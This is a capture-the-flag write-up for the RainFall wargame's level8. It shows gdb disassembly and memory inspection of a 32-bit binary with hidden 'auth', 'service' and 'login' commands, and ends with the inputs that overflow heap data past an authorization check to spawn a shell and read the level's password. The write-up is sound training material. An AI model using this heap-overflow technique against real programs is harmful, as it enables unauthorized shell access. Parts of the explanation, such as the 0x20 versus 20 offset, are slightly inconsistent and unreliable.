# LEVEL8 

## Analysis

```bash
   level8@RainFall:~$ ./level8 
   (nil), (nil) 
   ^[[A
   (nil), (nil) 

   (nil), (nil) 

   (nil), (nil) 
   ^C
   level8@RainFall:~$ ./level8 salut salut
   (nil), (nil) 

   (nil), (nil) 

   (nil), (nil) 

   (nil), (nil) 
   level8@RainFall:~$ ./level8 
   (nil), (nil) 
   z
   (nil), (nil) 
   dzdzdzd
   (nil), (nil) 
   dz zd
   (nil), (nil) 
```
Nothing much so far.

But if we analyse the code we can find a printf so let's try to check if it is protected and what
it is supposed to print and since we know that in x86-32 calling convention, arguments are pushed onto the stack in reverse order before the call.
So we can do the following:
```gdb
(gdb) break printf
Breakpoint 1 at 0xb7e78850
(gdb) run
Starting program: /home/user/level8/level8 

Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/100x $esp
0xbffff67c:     0x08048596      0x08048810      0x00000000      0x00000000
[...]
```
ESP+0  = return address (here 0x08048596 = main+50);
ESP+4  = argument 1;
ESP+8  = argument 2;
ESP+12 = argument 3;

So what is passed to printf:
```
   (gdb) x/s  0x08048810
   0x8048810:       "%p, %p \n"
```
Printf is "protected, we can't use format strings vulnerability, it tries to display 2 pointers and arguments 2 and 3 are NULL, that is why printf displays (nil).

At the end of our program we have the following:
```gdb
   0x080486ec <+392>:   je     0x80486ff <main+411>
   0x080486ee <+394>:   movl   $0x8048833,(%esp)
   0x080486f5 <+401>:   call   0x8048480 <system@plt>
```
```
   (gdb) break main
   Breakpoint 1 at 0x8048569
   (gdb) x/s 0x8048833
   0x8048833:       "/bin/sh"
```
The goal therefore is to get there for the program to send a shell on its own!


We can see there are a few (4) conditional jumps in the code, especially these lines "repz cmpsb %es:(%edi),%ds:(%esi)"
which are a common way to compare two strings, so we might try to see what is being compared:
```
[...]
   0x080485c1 <+93>:    mov    $0x8048819,%eax
   0x080485c6 <+98>:    mov    $0x5,%ecx
   0x080485cb <+103>:   mov    %edx,%esi
   0x080485cd <+105>:   mov    %eax,%edi
   0x080485cf <+107>:   repz cmpsb %es:(%edi),%ds:(%esi)
[...]
   0x08048648 <+228>:   mov    $0x804881f,%eax
   0x0804864d <+233>:   mov    $0x5,%ecx
   0x08048652 <+238>:   mov    %edx,%esi
   0x08048654 <+240>:   mov    %eax,%edi
   0x08048656 <+242>:   repz cmpsb %es:(%edi),%ds:(%esi)
[...]
   0x0804867e <+282>:   mov    $0x8048825,%eax
   0x08048683 <+287>:   mov    $0x6,%ecx
   0x08048688 <+292>:   mov    %edx,%esi
   0x0804868a <+294>:   mov    %eax,%edi
   0x0804868c <+296>:   repz cmpsb %es:(%edi),%ds:(%esi)
[...]
   0x080486bb <+343>:   mov    $0x804882d,%eax
   0x080486c0 <+348>:   mov    $0x5,%ecx
   0x080486c5 <+353>:   mov    %edx,%esi
   0x080486c7 <+355>:   mov    %eax,%edi
   0x080486c9 <+357>:   repz cmpsb %es:(%edi),%ds:(%esi)

```
What is being moved in the register eax (at the beginning of each block) is what is being compared to 
(at the end of each block) so let's try to check what is inside:

In GDB:
```
   (gdb) break main
   Breakpoint 1 at 0x8048569
   (gdb) run
   Starting program: /home/user/level8/level8 

   Breakpoint 1, 0x08048569 in main ()
   (gdb) x/s 0x8048819
   0x8048819:       "auth "
   (gdb) x/s 0x804881f
   0x804881f:       "reset"
   (gdb) x/s 0x8048825
   0x8048825:       "service"
   (gdb) x/s 0x804882d
   0x804882d:       "login"
```

It seems we have 4 different "commands" so let's try to use them:
```bash
   level8@RainFall:~$ ./level8 
   (nil), (nil) 
   auth
   (nil), (nil) 
   auth albert
   0x804a008, (nil)
   login
   Password:
   0x804a008, (nil) 
   login albert
   Password:
   0x804a008, (nil) 
```
Ok we successfully filled our first pointer! Nevertheless when we try to login, it asks for a password.
Let's keep searching for more information:
```bash
   reset
   0x804a008, (nil) 
   service
   0x804a008, 0x804a008 
```
Ok service seems to be filling the second pointer! but at the same location..
```
   auth poo
   0x804a018, 0x804a008 
   auth albert
   0x804a028, 0x804a008
```
Auth actually reset the first point and move to 10 in the memory, service works in the same way:
```
   service
   0x804a028, 0x804a038 
   service
   0x804a028, 0x804a048 
```


Let's focus on what happens before the call to system:
```
   0x080486bb <+343>:   mov    $0x804882d,%eax
   0x080486c0 <+348>:   mov    $0x5,%ecx
   0x080486c5 <+353>:   mov    %edx,%esi
   0x080486c7 <+355>:   mov    %eax,%edi
   0x080486c9 <+357>:   repz cmpsb %es:(%edi),%ds:(%esi)
   0x080486cb <+359>:   seta   %dl
   0x080486ce <+362>:   setb   %al
   0x080486d1 <+365>:   mov    %edx,%ecx
   0x080486d3 <+367>:   sub    %al,%cl
   0x080486d5 <+369>:   mov    %ecx,%eax
   0x080486d7 <+371>:   movsbl %al,%eax
   0x080486da <+374>:   test   %eax,%eax
   0x080486dc <+376>:   jne    0x8048574 <main+16>                 <== JUMP
   0x080486e2 <+382>:   mov    0x8049aac,%eax
   0x080486e7 <+387>:   mov    <0x20(%eax)>,%eax
   0x080486ea <+390>:   test   %eax,%eax
   0x080486ec <+392>:   je     0x80486ff <main+411>                <== JUMP
   0x080486ee <+394>:   movl   $0x8048833,(%esp)
   0x080486f5 <+401>:   call   0x8048480 <system@plt>
```

So it seems "login" (0x804882d) is the command to launch the shell but we need to avoid two jumps
on <+376> and <+392>.

As a reminder our input were the following:
```
auth polo
0x804a008, (nil) 
service albert
0x804a008, 0x804a018 
```


For the second we have:
```
(gdb) break *0x080486e2
Breakpoint 1 at 0x80486e2
(gdb) run
(gdb) ni
0x080486e7 in main ()
(gdb) info registers
eax            0x804a008        134520840
[...]
(gdb) x/s  0x804a008
0x804a008:       "polo\n"
```
And then we got this line "mov    <0x20(%eax)>,%eax" (Move into EAX the 32-bit value located at address:eax + 0x20)
what is inside:
```
   (gdb) x/s $eax+20
   0x804a01c:       "ert\n"
   (gdb) x/s $eax
   0x804a008:       "polo\n"
```
So the last chars we put inside service!


After using the commands auth, service and login we can inspect the code to see what happens before system:
```gdb
   (gdb) run
   (nil), (nil) 
   auth AAAAAAAAAAAA
   0x804a008, (nil) 
   service BBBBCCCCDDDDEEEEFFFF
   0x804a008, 0x804a018 
   login
   (gdb) c
   Continuing.
   Breakpoint 3, 0x080486e2 in main ()
   (gdb) x/s 0x8049aac
   0x8049aac <auth>:        "\b\240\004\b\030\240\004\b"
   (gdb) x/wx 0x8049aac
   0x8049aac <auth>:       0x0804a008
   (gdb) x/s 0x0804a008
   0x804a008:       'A' <repeats 12 times>, "!
```
So first auth's input is put inside 0x8049aac.
And in the following line we have:
```bash
   0x080486e7 <+387>:   mov    <0x20(%eax)>,%eax
   0x080486ea <+390>:   test   %eax,%eax
   0x080486ec <+392>:   je     0x80486ff <main+411>
```
The code is basically checking if what is inside eax+20 is 0 or not, and jump if it is:
```(gdb) 
   x/wx $eax+20
   0x804a01c:      0x43434342
```
That is 3 C's and 1 B. But wait that's actually some of what we wrote in service (service BBBBCCCCDDDDEEEEFFFF):
```
   (gdb) c
   Continuing.
   $ cat /home/user/level8/.pass
   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```
The solution was actually to authentificate to the program and overflow the command service...
